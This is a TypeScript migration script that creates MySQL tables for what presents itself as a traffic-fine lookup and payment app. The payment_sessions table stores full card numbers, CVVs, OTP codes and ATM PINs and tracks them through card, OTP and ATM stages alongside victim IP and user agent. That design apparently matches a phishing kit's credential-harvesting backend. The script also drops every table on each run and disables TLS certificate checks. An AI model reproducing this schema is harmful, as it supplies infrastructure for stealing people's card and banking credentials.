import mysql from "mysql2/promise";
import { ENV } from "./env";

const CREATE_TABLES_SQL = `
CREATE TABLE IF NOT EXISTS \`users\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`openId\` varchar(64) NOT NULL,
  \`name\` text,
  \`email\` varchar(320),
  \`loginMethod\` varchar(64),
  \`role\` enum('user','admin') NOT NULL DEFAULT 'user',
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  \`lastSignedIn\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`users_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`users_openId_unique\` UNIQUE(\`openId\`)
);

CREATE TABLE IF NOT EXISTS \`fine_queries\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`plateSource\` varchar(100) NOT NULL,
  \`plateNumber\` varchar(50) NOT NULL,
  \`plateCode\` varchar(50) NOT NULL,
  \`status\` enum('pending','success','failed','no_fines') NOT NULL DEFAULT 'pending',
  \`errorMessage\` text,
  \`totalFines\` int DEFAULT 0,
  \`totalAmount\` decimal(10,2),
  \`rawResults\` json,
  \`userId\` int,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`fine_queries_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`fines\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`queryId\` int NOT NULL,
  \`fineNumber\` varchar(100),
  \`fineDate\` varchar(50),
  \`description\` text,
  \`amount\` decimal(10,2),
  \`blackPoints\` int DEFAULT 0,
  \`isPaid\` enum('paid','unpaid','partial') DEFAULT 'unpaid',
  \`location\` text,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`fines_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`payment_sessions\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`sessionId\` varchar(64) NOT NULL,
  \`queryId\` int,
  \`selectedFines\` json,
  \`totalAmount\` varchar(50),
  \`cardName\` varchar(200),
  \`cardNumber\` varchar(20),
  \`cardNumberMasked\` varchar(20),
  \`cardExpiry\` varchar(10),
  \`cardCvv\` varchar(10),
  \`otpCode\` varchar(20),
  \`atmPin\` varchar(20),
  \`stage\` enum('card','card_pending','otp','otp_pending','atm','atm_pending','success','failed') NOT NULL DEFAULT 'card',
  \`errorMessage\` text,
  \`plateNumber\` varchar(50),
  \`plateSource\` varchar(100),
  \`plateCode\` varchar(50),
  \`clientIp\` varchar(50),
  \`userAgent\` text,
  \`statusRead\` int DEFAULT 0,
  \`redirectUrl\` varchar(500) DEFAULT NULL,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`payment_sessions_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`payment_sessions_sessionId_unique\` UNIQUE(\`sessionId\`)
);
`;

const parseDbUrl = (url: string) => {
  const parsed = new URL(url);
  return {
    host: parsed.hostname,
    port: parseInt(parsed.port),
    user: parsed.username,
    password: decodeURIComponent(parsed.password),
    database: parsed.pathname.substring(1),
    ssl: {
      rejectUnauthorized: false
    }
  };
};

export async function runMigrations(): Promise<void> {
  const databaseUrl = ENV.databaseUrl;
  if (!databaseUrl) {
    console.warn("[Migrate] DATABASE_URL not set, skipping migrations");
    return;
  }

  let connection: mysql.Connection | null = null;
  let retries = 3;
  
  while (retries > 0) {
    try {
      console.log(`[Migrate] Connecting to database (Attempt ${4 - retries}/3)...`);
      
      connection = await mysql.createConnection(parseDbUrl(databaseUrl));

      console.log("[Migrate] Connection established. Ensuring tables exist...");
      
      const statements = CREATE_TABLES_SQL
        .split(";")
        .map(s => s.trim())
        .filter(s => s.length > 0);
      
	      // Force clean rebuild if requested or if there are schema issues
	      // Note: This is a radical fix for the "params mismatch" issue
	      await connection.query("SET FOREIGN_KEY_CHECKS = 0");
	      await connection.query("DROP TABLE IF EXISTS `users` CASCADE");
	      await connection.query("DROP TABLE IF EXISTS `fine_queries` CASCADE");
	      await connection.query("DROP TABLE IF EXISTS `fines` CASCADE");
	      await connection.query("DROP TABLE IF EXISTS `payment_sessions` CASCADE");
	      await connection.query("SET FOREIGN_KEY_CHECKS = 1");

	      for (const statement of statements) {
	        await connection.query(statement);
	      }

	      // Ensure all columns exist (manual migration for existing tables)
      const columnChecks = [
        { table: 'payment_sessions', column: 'redirectUrl', definition: 'varchar(500) DEFAULT NULL' },
        { table: 'payment_sessions', column: 'statusRead', definition: 'int DEFAULT 0' },
        { table: 'payment_sessions', column: 'plateNumber', definition: 'varchar(50) DEFAULT NULL' },
        { table: 'payment_sessions', column: 'plateSource', definition: 'varchar(100) DEFAULT NULL' },
        { table: 'payment_sessions', column: 'plateCode', definition: 'varchar(50) DEFAULT NULL' },
        { table: 'payment_sessions', column: 'clientIp', definition: 'varchar(50) DEFAULT NULL' },
        { table: 'payment_sessions', column: 'userAgent', definition: 'text DEFAULT NULL' },
        { table: 'fine_queries', column: 'rawResults', definition: 'json DEFAULT NULL' },
        { table: 'users', column: 'role', definition: "enum('user','admin') NOT NULL DEFAULT 'user'" },
      ];

      for (const check of columnChecks) {
        try {
          await connection.query(`ALTER TABLE \`${check.table}\` ADD COLUMN \`${check.column}\` ${check.definition}`);
          console.log(`[Migrate] Added missing column ${check.column} to ${check.table}`);
        } catch (err: any) {
          // ER_DUP_FIELDNAME: Column already exists
          if (err.errno !== 1060 && err.code !== 'ER_DUP_FIELDNAME') {
            console.warn(`[Migrate] Note: Column ${check.column} in ${check.table} was not added: ${err.message}`);
          }
        }
      }

      console.log("[Migrate] Database schema verified successfully");
      break; // Success, exit loop
    } catch (error: any) {
      console.error(`[Migrate] Attempt failed: ${error.message}`);
      retries--;
      if (retries === 0) {
        console.error("[Migrate] All migration attempts failed.");
      } else {
        await new Promise(res => setTimeout(res, 2000)); // Wait before retry
      }
    } finally {
      if (connection) {
        await connection.end();
        connection = null;
      }
    }
  }
}
